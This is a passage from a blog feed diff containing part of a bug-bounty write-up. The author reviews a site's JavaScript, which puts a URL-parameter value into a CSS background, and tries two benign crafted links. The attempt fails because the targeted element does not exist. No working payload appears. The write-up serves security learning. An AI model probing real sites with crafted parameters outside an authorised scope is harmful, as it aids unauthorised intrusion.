+&lt;p&gt;All these malicious actions can be performed with just a single click from the user, increasing the risk and ease of the attack.&lt;/p&gt;
+&lt;h3 id=&#34;2-css-injection&#34;&gt;2. CSS Injection?&lt;/h3&gt;
+&lt;p&gt;While checking a static page of an in-scope application, I came across an interesting JavaScript file.&lt;/p&gt;
+&lt;p&gt;The code looked like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Javascript&#34; data-lang=&#34;Javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;current_url_string&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; window.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;current_url&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;URL&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;current_url_string&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;linkObj&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;current_url&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;searchParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;link1&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userPhotoUrl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;current_url&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;searchParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;user_photo_url&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;decodeDeepLink&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;linkObj&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;user_photo_url&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;photoBaseUrl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://REDACTED.example.com/media/profile-photos&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;userPhotoUrl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userPhotoUrl&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;startsWith&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;photoBaseUrl&lt;/span&gt;)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.profile-img-placeholder&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;css&lt;/span&gt;(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;background&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;url(&amp;#34;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userPhotoUrl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#34;)&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I started to analyze the JavaScript code by manually reading.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Javascript&#34; data-lang=&#34;Javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;current_url_string&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; window.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;current_url&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;URL&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;current_url_string&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;linkObj&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;current_url&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;searchParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;link1&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userPhotoUrl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;current_url&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;searchParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;user_photo_url&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;decodeLink&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;linkObj&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;user_photo_url&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This subsection retrives the &lt;code&gt;link1&lt;/code&gt; and &lt;code&gt;user_photo_url&lt;/code&gt; parameters from the URL. The &lt;code&gt;user_photo_url&lt;/code&gt; is a direct URL to the user&amp;rsquo;s profile picture. The other &lt;code&gt;link1&lt;/code&gt; parameter is a base64 encoded JSON object that is decoded using the &lt;code&gt;decodeLink()&lt;/code&gt; function.&lt;/p&gt;
+&lt;p&gt;Here is the working of this function:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Javascript&#34; data-lang=&#34;Javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decodeDeepLink&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;JSON&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;atob&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After decoding the &lt;code&gt;link1&lt;/code&gt; parameter, it extracts the value of &lt;code&gt;user_photo_url&lt;/code&gt; key from the JSON.&lt;/p&gt;
+&lt;p&gt;The following subsection takes the &lt;code&gt;user_photo_url&lt;/code&gt; and puts it directly in the CSS of the element having the &lt;code&gt;.profile-img-placeholder&lt;/code&gt; as the CSS class.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Javascript&#34; data-lang=&#34;Javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;userPhotoUrl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userPhotoUrl&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;startsWith&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;photoBaseUrl&lt;/span&gt;)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.profile-img-placeholder&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;css&lt;/span&gt;(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;background&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;url(&amp;#34;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userPhotoUrl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#34;)&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To set a user-provided value in the CSS of this class, I thought to provide a link like this:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://REDACTED.example.com/index.html?link1=eyJ1c2VyX3Bob3RvX3VybCI6ICJodHRwOi8vd3d3LmV4YW1wbGUuY29tIn0=&#34;&gt;https://REDACTED.example.com/index.html?link1=eyJ1c2VyX3Bob3RvX3VybCI6ICJodHRwOi8vd3d3LmV4YW1wbGUuY29tIn0=&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;When decoded, it becomes this JSON:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-JSON&#34; data-lang=&#34;JSON&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;user_photo_url&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://www.example.com&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This did not work obviously because I had overlooked a crucial detail. There is a &lt;code&gt;startsWith(photoBaseUrl)&lt;/code&gt; function that check if the value of &lt;code&gt;user_photo_url&lt;/code&gt; starts with &amp;ldquo;&lt;a href=&#34;https://REDACTED.example.com/media/profile-photos%22&#34;&gt;https://REDACTED.example.com/media/profile-photos&amp;quot;&lt;/a&gt; or not. In my case, it did not. So, no reflections whatsoever in DOM.&lt;/p&gt;
+&lt;p&gt;Then I used the following URL to trigger the change in DOM:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://REDACTED.example.com/index.html?link1=eyJ1c2VyX3Bob3RvX3VybCI6ICJodHRwczovL1JFREFDVEVELmV4YW1wbGUuY29tL21lZGlhL3Byb2ZpbGUtcGhvdG9zIn0=&#34;&gt;https://REDACTED.example.com/index.html?link1=eyJ1c2VyX3Bob3RvX3VybCI6ICJodHRwczovL1JFREFDVEVELmV4YW1wbGUuY29tL21lZGlhL3Byb2ZpbGUtcGhvdG9zIn0=&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;link1&lt;/code&gt; parameter decodes to this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-JSON&#34; data-lang=&#34;JSON&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;user_photo_url&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://REDACTED.example.com/media/profile-photos&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This should trigger the DOM change, right? Wrong! This did not trigger any changes whatsoever.&lt;/p&gt;
+&lt;p&gt;I kept digging in the code more and more. Almost to the point where I decided to give up. Then, I thought to search in my Burp Suite history about this CSS class &lt;code&gt;.profile-img-placeholder&lt;/code&gt;. I wanted to see where this class is used so I can better understand the issue.&lt;/p&gt;
+&lt;p&gt;And as it turns out, there was no element that had this class. The only file where I found this CSS class to be refereced was this very script I was reading. No other references were found even after manually crawling the entire website.&lt;/p&gt;
+&lt;p&gt;In the future, if the &lt;code&gt;.profile-img-placeholder&lt;/code&gt; class is added, I&amp;rsquo;ll be prepared to exploit this vulnerability.&lt;/p&gt;
+&lt;p&gt;This is it. End of article. Apparantly, not all writeups end with a bounty.&lt;/p&gt;
+&lt;h3 id=&#34;conclusiontakeaways&#34;&gt;Conclusion/Takeaways&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;Always check the scope you&amp;rsquo;re hacking before and after submitting the report.&lt;/li&gt;
+&lt;li&gt;Learn a programming language of your choice.&lt;/li&gt;
+&lt;li&gt;Manually review the source code in order to identify any potential vulnerabilities. With frequent practise, vulnerable code sections are easier to identify revealing potential vulnerabilities.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;I work full time as a bug bounty hunter mostly hacking in Synack Red Team (SRT). If you&amp;rsquo;re interested in becoming a part of the Synack Red Team, feel free to connect with me on Twitter, Instagram, or LinkedIn. I&amp;rsquo;m always happy to offer guidance to fellow cybersecurity enthusiasts.&lt;/p&gt;
+&lt;p&gt;Cheers! Adios!&lt;/p&gt;
+</content>
+    </item>
+    
     <item>
       <title>Holiday Hunting With Aquatone</title>
       <link>https://kuldeep.io/posts/holiday-hunting-with-aquatone/</link>
